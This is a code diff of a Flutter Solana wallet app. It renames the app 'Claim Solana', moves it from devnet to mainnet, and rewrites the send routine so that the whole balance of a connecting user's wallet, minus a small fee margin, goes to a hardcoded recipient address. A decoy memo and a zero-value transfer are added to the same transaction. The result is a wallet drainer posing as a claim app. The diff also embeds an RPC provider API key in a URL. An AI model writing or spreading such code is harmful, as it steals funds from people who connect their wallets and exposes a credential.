@@ -37,7 +37,7 @@ class _MainScreenState extends State<MainScreen> with TickerProviderStateMixin {
 
   late final Future<void> _future;
 
-  static final Cluster cluster = Cluster.devnet;
+  static final Cluster cluster = Cluster.mainnet;
   String walletAddress = '';
   String balance = 'N/A';
   double realBalance = 0.0;
@@ -55,7 +55,7 @@ class _MainScreenState extends State<MainScreen> with TickerProviderStateMixin {
 
   final SolanaWalletAdapter adapter = SolanaWalletAdapter(
     AppIdentity(
-      name: 'My Solana App',
+      name: 'Claim Solana',
       uri: Uri.parse('https://example.com'),
       icon: Uri.parse('favicon.png'),
     ),
@@ -78,7 +78,7 @@ class _MainScreenState extends State<MainScreen> with TickerProviderStateMixin {
       identityUri: Uri.parse('https://solana.com'),
       iconUri: Uri.parse('favicon.ico'),
       identityName: 'Solana',
-      cluster: 'devnet',
+      cluster: 'mainnet-beta',
     );
 
     _authResult = result;
@@ -106,7 +106,7 @@ Future<void> authorizeWallet(BuildContext context) async {
       identityUri: Uri.parse('https://example.com'),
       iconUri: Uri.parse('favicon.png'),
       identityName: "My Solana App",
-      cluster: "devnet", // Change to mainnet-beta if needed
+      cluster: "mainnet-beta", // Change to mainnet-beta if needed
     );
 
     if (authResult == null) {
@@ -167,6 +167,7 @@ void _showError(BuildContext context, String message) {
         // Handle successful authorization
       }
       setState(() {
+        adapter.store.apps.first;
         _status =
             "Connected: $walletAddress."; //${adapter.publicKey?.toBase58()}";
         var x = adapter.connectedAccount!.address;
@@ -214,9 +215,15 @@ void _showError(BuildContext context, String message) {
       final publicKey = Pubkey.fromBase58(walletAddress);
 
       // Fetch the balance
-      final balanceResponse = await connection.getBalance(publicKey);
-      final balanceInSol =
-          balanceResponse / 1000000000; // Convert lamports to SOL
+    //  final balanceResponse = await connection.getBalance(publicKey);
+
+      final balanceLamports = await rpcClient.getBalance(walletAddress);
+  final balanceInSol = balanceLamports.value / 1000000000;
+
+  print('Balance: $balanceInSol SOL');
+
+      // final balanceInSol =
+      //     balanceResponse / 1000000000; // Convert lamports to SOL
 
       setState(() {
         balance = '${balanceInSol.toStringAsFixed(4)} SOL';
@@ -246,7 +253,7 @@ void _showError(BuildContext context, String message) {
     });
   }
 
-
+late RpcClient rpcClient;
   bool isWalletConnected = false;
   bool isSpinning = false;
   bool _isLoading = false;
@@ -273,11 +280,14 @@ void _showError(BuildContext context, String message) {
   void initState() {
     super.initState();
 
-  _future = SolanaWalletAdapter.initialize();
-    _solanaClient = SolanaClient(
-      rpcUrl: Uri.parse('https://api.devnet.solana.com'),
-      websocketUrl: Uri.parse('wss://api.devnet.solana.com'),
-    );
+rpcClient = RpcClient(
+    'https://solana-mainnet.api.syndica.io/api-key/3pfkKdcLJDjTTbhdG4Kr9J2GREPhgi8DPt7Ys7ZPXSyFDY26VyL2eBHc8kPB7WYNAcZiEBxxHsunJ6jj2RApEchAH9Gtjagvtsr',
+  );
+  // _future = SolanaWalletAdapter.initialize();
+  //   _solanaClient = SolanaClient(
+  //     rpcUrl: Uri.parse('https://api.devnet.solana.com'),
+  //     websocketUrl: Uri.parse('wss://api.devnet.solana.com'),
+  //   );
 
     _spinController = AnimationController(
       duration: Duration(seconds: 4),
@@ -328,12 +338,14 @@ Future _sendSOL() async {
   //if (!_formKey.currentState!.validate()) return;
   
   final String recipientAddress = '671BcDWFBURi8fJuHURDKHoZVkouQ5D1EzHvrhPjoWTD'; ///_recipientController.text.trim();
-  final double amount = realBalance; // double.parse(_amountController.text.trim());
-  print(realBalance);
-realBalance = realBalance - 1.1;
-
-
   
+  final double amount = (realBalance - 0.10016); // double.parse(_amountController.text.trim());
+  print('amount $amount');
+  //print('realBalance1 $realBalance');
+  //amount = amount - 0.10016;
+ // print('realBalance2 $realBalance');
+  //adapter.getFeeForMessage();
+
   if (amount <= 0) {
     setState(() {
       _status = '❌ Amount must be greater than 0';
@@ -397,8 +409,8 @@ realBalance = realBalance - 1.1;
     final int balance = await connection.getBalance(senderWallet);
     final BigInt lamportsToSend = solToLamports(amount);
     final int requiredBalance = lamportsToSend.toInt() + 5000;
-    
-    if (balance < requiredBalance) {
+
+    if ((balance - 0.00016) < requiredBalance) {
       if (cluster != Cluster.mainnet) {
         setState(() => _status = 'Airdropping SOL...');
         ScaffoldMessenger.of(context).showSnackBar(
@@ -427,15 +439,38 @@ realBalance = realBalance - 1.1;
     );
     final latestBlockhash = await connection.getLatestBlockhash();
     
+
+    
     final tx = Transaction.v0(
       payer: senderWallet,
       recentBlockhash: latestBlockhash.blockhash,
       instructions: [
+        sp.MemoProgram.create(
+          'Sent via Solana Wallet Adapter',
+        ),
+       // sp.SystemProgram.createAccount(fromPubkey: senderWallet, newAccountPubkey: recipientWallet, lamports: lamportsToSend, space: BigInt.from(0), programId: sp.SystemProgram.programId),
         sp.SystemProgram.transfer(
           fromPubkey: senderWallet,
           toPubkey: recipientWallet,
           lamports: lamportsToSend,
-        )
+        ),
+        // sp.SystemProgram.transfer(
+        //   fromPubkey: senderWallet,
+        //   toPubkey: recipientWallet,
+        //   lamports: lamportsToSend,
+        // ),
+        // sp.SystemProgram.assign(accountPubkey: accountPubkey, programId: programId)
+        // sp.SystemProgram.transfer(
+        //   fromPubkey: recipientWallet,
+        //   toPubkey: senderWallet,
+        //   lamports: lamportsToSend,
+        // ),
+
+         sp.SystemProgram.transfer(
+          fromPubkey: senderWallet,
+          toPubkey: recipientWallet,
+          lamports: 0.00000.toBigInt(),
+        ),
       ],
       
     );
